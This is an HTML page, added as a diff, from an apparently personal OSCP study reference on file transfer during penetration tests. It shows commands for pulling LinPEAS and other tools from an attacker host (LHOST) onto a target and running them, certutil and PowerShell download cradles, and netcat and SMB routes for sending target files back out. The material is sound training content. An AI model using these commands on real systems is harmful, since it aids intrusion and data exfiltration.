@@ -1,0 +1,225 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="generator" content="Astro v7.2.0"><meta name="description" content="Commands, variants, interpretation and next actions for File Transfer."><meta name="theme-color" content="#121414"><link rel="canonical" href="https://armaanleg3nd.github.io/tools/oscp/reference/04-shells-transfers-credentials/01-file-transfer/"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><meta property="og:title" content="File Transfer | OSCP reference | Armaan"><meta property="og:description" content="Commands, variants, interpretation and next actions for File Transfer."><meta property="og:type" content="website"><meta property="og:url" content="https://armaanleg3nd.github.io/tools/oscp/reference/04-shells-transfers-credentials/01-file-transfer/"><title>File Transfer | OSCP reference | Armaan</title><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="swap"><script type="module" src="/_assets/ClientRouter.astro_astro_type_script_index_0_lang.xc6nT38P.js"></script><link rel="stylesheet" href="/_assets/BaseLayout.C8rLAhpp.css"><link rel="stylesheet" href="/_assets/ToolLayout.Bh0Ez8ox.css"><style>.full-reference{max-width:1420px;color:var(--text);margin:auto;padding:2rem clamp(1rem,4vw,4rem) 5rem}.full-reference a{color:var(--cyan-soft)}.full-reference h1{margin:1.25rem 0;font-size:clamp(1.7rem,3vw,2.5rem);line-height:1.2}.full-reference p{color:var(--muted);max-width:80ch;line-height:1.8}.reference-find{gap:.6rem;max-width:44rem;margin:1.5rem 0;font-size:.85rem;display:grid}.reference-find input{border:1px solid var(--line-strong);background:var(--surface-low);color:var(--text);border-radius:3px;padding:.8rem}.reference-index{grid-template-columns:repeat(2,minmax(0,1fr));gap:2rem;display:grid}.reference-index section{min-width:0}.reference-index h2{text-transform:capitalize;border-bottom:1px solid var(--line);padding-bottom:.7rem;font-size:1.2rem}.reference-index h3{margin:1.3rem 0 .5rem;font-size:1rem}.reference-index ul{padding-left:1.2rem;font-size:.84rem;line-height:1.9}.reference-index .level-3{color:var(--muted);margin-left:1rem;font-size:.76rem}.reference-index [hidden]{display:none}.reference-reading{grid-template-columns:240px minmax(0,1fr);gap:2.5rem;display:grid}.reference-reading nav{top:calc(var(--header-height) + 1rem);max-height:calc(100dvh - var(--header-height) - 2rem);border-right:1px solid var(--line);align-self:start;padding:1rem;font-size:.76rem;position:sticky;overflow:auto}.reference-reading nav ul{padding:0;list-style:none}.reference-reading nav li{margin:.7rem 0;line-height:1.5}.reference-reading nav .level-3{padding-left:1rem;font-size:.7rem}.reference-prose{min-width:0;line-height:1.85}.reference-prose :is(h1,h2,h3,h4){scroll-margin-top:calc(var(--header-height) + 1.5rem);margin:2rem 0 1rem;line-height:1.35}.reference-prose h2{border-top:1px solid var(--line);padding-top:1.5rem;font-size:1.35rem}.reference-prose h3{font-size:1.05rem}.reference-prose pre{border:1px solid var(--line);background:var(--surface-low);max-width:100%;font:.8rem/1.75 var(--mono);border-radius:3px;padding:2.5rem 1rem 1rem;position:relative;overflow:auto}.reference-prose [data-reference-copy]{border:1px solid var(--line);color:var(--cyan-soft);font:.65rem var(--mono);cursor:pointer;background:0 0;padding:.2rem .5rem;position:absolute;top:.4rem;right:.5rem}.reference-prose code{overflow-wrap:anywhere;font-size:.85em}.reference-prose pre code{overflow-wrap:normal;font-size:inherit}.reference-prose blockquote{border-left:2px solid var(--cyan);color:var(--muted);margin:1.25rem 0;padding-left:1rem}.reference-prose table{border-collapse:collapse;max-width:100%;font-size:.8rem;display:block;overflow:auto}.reference-prose :is(td,th){border:1px solid var(--line);text-align:left;padding:.6rem}.reference-prose img{max-width:100%;height:auto}.reference-prose details{border-top:1px solid var(--line);padding:.8rem 0}.reference-prose summary{cursor:pointer;color:var(--cyan-soft)}@media (width<=850px){.reference-index,.reference-reading{grid-template-columns:1fr}.reference-reading nav{border:1px solid var(--line);max-height:18rem;position:static}.full-reference{padding-top:1rem}}
+</style><style>[data-astro-transition-scope="astro-nfpogox7-1"] { view-transition-name: page-content; }@layer astro { ::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head><body><a class="skip-link" href="#main-content">Skip to content</a><header class="site-header" data-astro-cid-wpvy4v7s><nav class="site-nav" aria-label="Primary navigation" data-astro-cid-wpvy4v7s><a class="brand" href="/" aria-label="leg3nd home" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>leg3nd</span><small data-astro-cid-wpvy4v7s>Projects &amp; tools</small></a><button class="nav-toggle" type="button" aria-expanded="false" aria-controls="nav-links" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>MENU</span><span class="nav-toggle__glyph" aria-hidden="true" data-astro-cid-wpvy4v7s>[+]</span></button><div class="nav-links" id="nav-links" data-astro-cid-wpvy4v7s><a href="/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>01</span>Home</a><a href="/projects/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>02</span>Projects</a><a href="/tools/" class="active" aria-current="page" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>03</span>Tools</a></div><div class="system-state" aria-label="Timezone" data-astro-cid-wpvy4v7s>GMT+8</div></nav></header><script type="module">var e=()=>{let e=document.querySelector(`.nav-toggle`),t=document.querySelector(`.nav-links`);if(!e||!t||e.dataset.bound===`true`)return;e.dataset.bound=`true`;let n=()=>{e.setAttribute(`aria-expanded`,`false`),t.dataset.open=`false`;let n=e.querySelector(`.nav-toggle__glyph`);n&&(n.textContent=`[+]`)};e.addEventListener(`click`,()=>{let n=e.getAttribute(`aria-expanded`)===`true`;e.setAttribute(`aria-expanded`,String(!n)),t.dataset.open=String(!n);let r=e.querySelector(`.nav-toggle__glyph`);r&&(r.textContent=n?`[+]`:`[-]`)}),t.addEventListener(`click`,e=>{e.target.closest(`a`)&&n()}),e.closest(`nav`)?.addEventListener(`keydown`,t=>{t.key===`Escape`&&(n(),e.focus())})};document.addEventListener(`astro:page-load`,e),e();</script><div data-astro-transition-scope="astro-nfpogox7-1" id="main-content"><div class="tools-surface"><main class="full-reference"><p><a href="/tools/oscp/reference/">← Complete task index</a> · <a href="/tools/oscp/">Workspace</a></p><div class="reference-reading"><nav aria-label="On this page"><strong>On this page</strong><ul><li class="level-2"><a href="#linux-target-pull-linpeas-from-kali-over-http">Linux target: pull LinPEAS from Kali over HTTP</a></li><li class="level-3"><a href="#serve-a-fixed-directory-without-changing-folders">Serve a fixed directory without changing folders</a></li><li class="level-3"><a href="#linux-target-with-curl">Linux target with curl</a></li><li class="level-3"><a href="#windows-target-with-powershell">Windows target with PowerShell</a></li><li class="level-3"><a href="#windows-alternatives">Windows alternatives</a></li><li class="level-2"><a href="#verify-the-transfer">Verify the transfer</a></li><li class="level-3"><a href="#kali-to-a-linux-target">Kali to a Linux target</a></li><li class="level-3"><a href="#linux-target-to-kali">Linux target to Kali</a></li><li class="level-3"><a href="#ssh-key-or-nonstandard-port">SSH key or nonstandard port</a></li><li class="level-3"><a href="#start-an-authenticated-smb-share-on-kali">Start an authenticated SMB share on Kali</a></li><li class="level-3"><a href="#connect-and-download-from-windows">Connect and download from Windows</a></li><li class="level-3"><a href="#upload-evidence-from-windows-to-kali">Upload evidence from Windows to Kali</a></li><li class="level-3"><a href="#retrieve-a-file-from-the-target-to-kali">Retrieve a file from the target to Kali</a></li><li class="level-3"><a href="#send-a-file-from-kali-to-the-target">Send a file from Kali to the target</a></li><li class="level-3"><a href="#encode-on-linux">Encode on Linux</a></li><li class="level-3"><a href="#decode-on-linux">Decode on Linux</a></li><li class="level-3"><a href="#decode-in-powershell">Decode in PowerShell</a></li><li class="level-2"><a href="#php-http-file-server-when-python-is-unavailable">PHP HTTP file server when Python is unavailable</a></li></ul></nav><article class="reference-prose"><h1 id="file-transfer">File Transfer</h1>
+<p><a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/README.md">← Reference index</a> · <a href="/tools/oscp/reference/03-initial-access/01-rdp-access/">Previous: RDP access</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/Attack_Strategy_Map.md">Strategy map</a> | Study methods: <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/methods/sessions-transfers.md">Establish sessions and move files</a></p>
+<blockquote>
+<p><strong>Choose:</strong> HTTP pull when the target can reach Kali; SCP when SSH credentials work; SMB for a Windows-friendly read/write share; Netcat or Base64 only when the simpler route is unavailable.</p>
+</blockquote>
+<h2 id="linux-target-pull-linpeas-from-kali-over-http">Linux target: pull LinPEAS from Kali over HTTP</h2>
+<p>On Kali, serve the directory containing <code>linpeas.sh</code>:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">cd /path/to/tools
+python3 -m http.server 8000 --bind 0.0.0.0
+</code></pre>
+<p>On the Linux target, download into a writable directory and run it:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">wget http://LHOST:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh | tee /tmp/linpeas.txt
+</code></pre>
+<blockquote>
+<p><strong>Read:</strong> Kali should log an HTTP request and a successful response. A downloaded enumeration script is a lead generator; manually verify any escalation candidate.</p>
+</blockquote>
+<details>
+<summary><strong>HTTP variants — fixed server directory, curl, Windows and alternate built-ins</strong></summary>
+<h3 id="serve-a-fixed-directory-without-changing-folders">Serve a fixed directory without changing folders</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">python3 -m http.server 8000 --bind 0.0.0.0 --directory /path/to/tools
+</code></pre>
+<p>Python's simple server supplies downloads over unencrypted HTTP. Stop it with <code>Ctrl+C</code> when finished.</p>
+<h3 id="linux-target-with-curl">Linux target with curl</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">curl -fL http://LHOST:8000/FILE -o /tmp/FILE
+</code></pre>
+<p><code>-f</code> reports HTTP errors and <code>-L</code> follows redirects. Use a writable destination.</p>
+<h3 id="windows-target-with-powershell">Windows target with PowerShell</h3>
+<p>Run inside PowerShell:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Invoke-WebRequest -Uri "http://LHOST:8000/FILE" -OutFile "C:\Windows\Temp\FILE"
+</code></pre>
+<p>From <code>cmd.exe</code>, invoke PowerShell explicitly:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">powershell -NoProfile -Command "Invoke-WebRequest -Uri 'http://LHOST:8000/FILE' -OutFile 'C:\Windows\Temp\FILE'"
+</code></pre>
+<h3 id="windows-alternatives">Windows alternatives</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">(New-Object Net.WebClient).DownloadFile('http://LHOST:8000/FILE','C:\Windows\Temp\FILE')
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">curl.exe -fL http://LHOST:8000/FILE -o C:\Windows\Temp\FILE
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">certutil.exe -urlcache -split -f http://LHOST:8000/FILE C:\Windows\Temp\FILE
+</code></pre>
+<p>Availability and policy can differ by host. <code>certutil</code> may leave URL-cache artifacts; remove only artifacts you created when cleanup is appropriate.</p>
+</details>
+<h2 id="verify-the-transfer">Verify the transfer</h2>
+<p>Compare the source and destination hashes.</p>
+<p>On Kali or Linux:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">sha256sum FILE
+sha256sum /tmp/FILE
+</code></pre>
+<p>On Windows:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-FileHash -Algorithm SHA256 "C:\Windows\Temp\FILE"
+</code></pre>
+<blockquote>
+<p><strong>Decisive output:</strong> matching SHA-256 values establish that the two saved files contain the same bytes. A successful HTTP status alone does not.</p>
+</blockquote>
+<details>
+<summary><strong>SCP — copy through an authenticated SSH service</strong></summary>
+<h3 id="kali-to-a-linux-target">Kali to a Linux target</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">scp FILE USER@TARGET:/tmp/FILE
+</code></pre>
+<h3 id="linux-target-to-kali">Linux target to Kali</h3>
+<p>Run from Kali when the target's SSH service is reachable:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">scp USER@TARGET:/path/to/FILE ./FILE
+</code></pre>
+<h3 id="ssh-key-or-nonstandard-port">SSH key or nonstandard port</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">scp -i KEY -P PORT FILE USER@TARGET:/tmp/FILE
+</code></pre>
+<p><code>scp</code> uses uppercase <code>-P</code> for the SSH port. Authentication success does not guarantee write permission at the destination path.</p>
+</details>
+<details>
+<summary><strong>SMB — read and write files from Windows</strong></summary>
+<h3 id="start-an-authenticated-smb-share-on-kali">Start an authenticated SMB share on Kali</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">mkdir -p share
+sudo impacket-smbserver transfer "$(pwd)/share" -smb2support -username USER -password 'PASSWORD'
+</code></pre>
+<p>The first positional value is the share name; the second is its local directory. The supplied <code>USER</code> and <code>PASSWORD</code> authenticate to this temporary Kali share.</p>
+<p>Some installations expose the legacy wrapper name:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">sudo smbserver.py transfer "$(pwd)/share" -smb2support -username USER -password 'PASSWORD'
+</code></pre>
+<h3 id="connect-and-download-from-windows">Connect and download from Windows</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">net use \\LHOST\transfer /user:USER "PASSWORD"
+copy \\LHOST\transfer\FILE C:\Windows\Temp\FILE
+</code></pre>
+<h3 id="upload-evidence-from-windows-to-kali">Upload evidence from Windows to Kali</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">copy C:\Windows\Temp\FILE \\LHOST\transfer\FILE
+net use \\LHOST\transfer /delete
+</code></pre>
+<p>Kali must accept inbound TCP/445 and the target must permit outbound SMB. The share is read/write unless started with Impacket's <code>-readonly</code> option.</p>
+</details>
+<details>
+<summary><strong>Netcat — stream a file when a direct TCP connection is possible</strong></summary>
+<h3 id="retrieve-a-file-from-the-target-to-kali">Retrieve a file from the target to Kali</h3>
+<p>Kali receives:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">nc -lvnp PORT > FILE
+</code></pre>
+<p>The target sends:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">nc -nv LHOST PORT &#x3C; /path/to/FILE
+</code></pre>
+<h3 id="send-a-file-from-kali-to-the-target">Send a file from Kali to the target</h3>
+<p>The target receives:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">nc -lvnp PORT > /tmp/FILE
+</code></pre>
+<p>Kali sends:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">nc -nv TARGET PORT &#x3C; FILE
+</code></pre>
+<p>If the listener rejects <code>-p</code>, use the OpenBSD-style form and check <code>nc -h</code> locally:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">nc -lvn PORT > FILE
+</code></pre>
+<p>Netcat provides no authentication, encryption, filename metadata or integrity check. Confirm direction and compare hashes afterward.</p>
+</details>
+<details>
+<summary><strong>Temporary FTP — only when an FTP client is the available route</strong></summary>
+<p>On Kali, after intentionally selecting/installing <code>pyftpdlib</code> in an isolated environment:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">python3 -m pyftpdlib -p PORT
+</code></pre>
+<p>On the target:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">ftp LHOST PORT
+binary
+get FILE
+put FILE
+quit
+</code></pre>
+<p>The default temporary server can be unauthenticated and plaintext. Bind/serve only the intended directory, expose it only for the transfer, compare hashes and stop it immediately. HTTP/SCP/SMB are normally preferable.</p>
+</details>
+<details>
+<summary><strong>Base64 — move a small file through a text-only channel</strong></summary>
+<h3 id="encode-on-linux">Encode on Linux</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">base64 -w 0 FILE
+</code></pre>
+<h3 id="decode-on-linux">Decode on Linux</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">printf '%s' 'BASE64_DATA' | base64 -d > /tmp/FILE
+</code></pre>
+<h3 id="decode-in-powershell">Decode in PowerShell</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">[IO.File]::WriteAllBytes('C:\Windows\Temp\FILE',[Convert]::FromBase64String('BASE64_DATA'))
+</code></pre>
+<p>Use this for small files. Long encoded values are easy to truncate or corrupt; compare hashes.</p>
+</details>
+<details>
+<summary><strong>Failure cues — identify the broken layer</strong></summary>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Symptom</th><th>Check next</th></tr></thead><tbody><tr><td>Kali logs no HTTP request</td><td>Confirm <code>LHOST</code>, target-to-Kali route, listener bind address and outbound filtering</td></tr><tr><td>HTTP returns 404</td><td>Confirm the server directory, exact filename and case</td></tr><tr><td>Destination reports permission denied</td><td>Use a writable directory such as <code>/tmp</code> or the current user's Windows temp directory</td></tr><tr><td>File downloads but does not run</td><td>Verify its hash, interpreter/architecture, execute permission and line endings</td></tr><tr><td>SCP authenticates but cannot write</td><td>Change the remote destination to a directory writable by that identity</td></tr><tr><td>SMB connection fails</td><td>Check TCP/445 reachability, credentials, SMB2 support and existing Windows connections to the same server</td></tr><tr><td>Netcat connects but the file differs</td><td>Repeat with clear sender/receiver roles and compare hashes before executing</td></tr></tbody></table>
+</details>
+<h2 id="php-http-file-server-when-python-is-unavailable">PHP HTTP file server when Python is unavailable</h2>
+<p>Use on the sending host when PHP CLI is present and the receiver can reach it. Serve a directory containing only the intended transfer artifacts.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">php -S 0.0.0.0:8000 -t ./transfer
+
+# Receiver: use the actual sender address and verify the received artifact
+curl -f http://LHOST:8000/FILE -o FILE
+</code></pre>
+<p>Read: this is a file-serving route, not an upload server or a shell. Check the HTTP status, file size/hash and target architecture before execution. If the target cannot initiate this connection, choose another transfer direction/transport rather than restarting the same server.</p>
+<p>Sources: <a href="https://www.php.net/manual/en/features.commandline.webserver.php">upstream 1</a>.</p></article></div></main></div></div><footer class="site-footer" data-astro-cid-jo6i4kqk><div class="footer-inner" data-astro-cid-jo6i4kqk><nav class="footer-links" aria-label="Footer navigation" data-astro-cid-jo6i4kqk><a href="/" data-astro-cid-jo6i4kqk>Home</a><a href="/projects/" data-astro-cid-jo6i4kqk>Projects</a><a href="/tools/" aria-current="page" data-astro-cid-jo6i4kqk>Tools</a></nav><nav class="footer-tools" aria-label="Interactive tools" data-astro-cid-jo6i4kqk><span data-astro-cid-jo6i4kqk>Interactive tools</span><a href="/tools/oscp/" aria-current="page" data-astro-cid-jo6i4kqk>OSCP strategy workspace <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a><a href="/tools/attack-path/" data-astro-cid-jo6i4kqk>Attack-path visualizer <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a></nav><div class="footer-meta" data-astro-cid-jo6i4kqk><p data-astro-cid-jo6i4kqk>© 2026 Armaan. Built with curiosity.</p><div data-astro-cid-jo6i4kqk><a href="https://github.com/ArmaanLeg3nd" target="_blank" rel="noreferrer" data-astro-cid-jo6i4kqk>GitHub ↗</a><span data-astro-cid-jo6i4kqk>GMT+8</span></div></div></div></footer><script type="module" src="/_assets/MotionController.astro_astro_type_script_index_0_lang.BuT1diwy.js"></script></body></html><script type="module">function e(){document.querySelectorAll(`[data-reference-copy]`).forEach(e=>{e.dataset.ready||(e.dataset.ready=`true`,e.addEventListener(`click`,async()=>{let t=e.parentElement?.querySelector(`code`);if(t){try{await navigator.clipboard.writeText(t.textContent||``),e.textContent=`Copied`}catch{e.textContent=`Select and copy`}window.setTimeout(()=>e.textContent=`Copy`,1600)}}))})}e(),document.addEventListener(`astro:page-load`,e);</script>
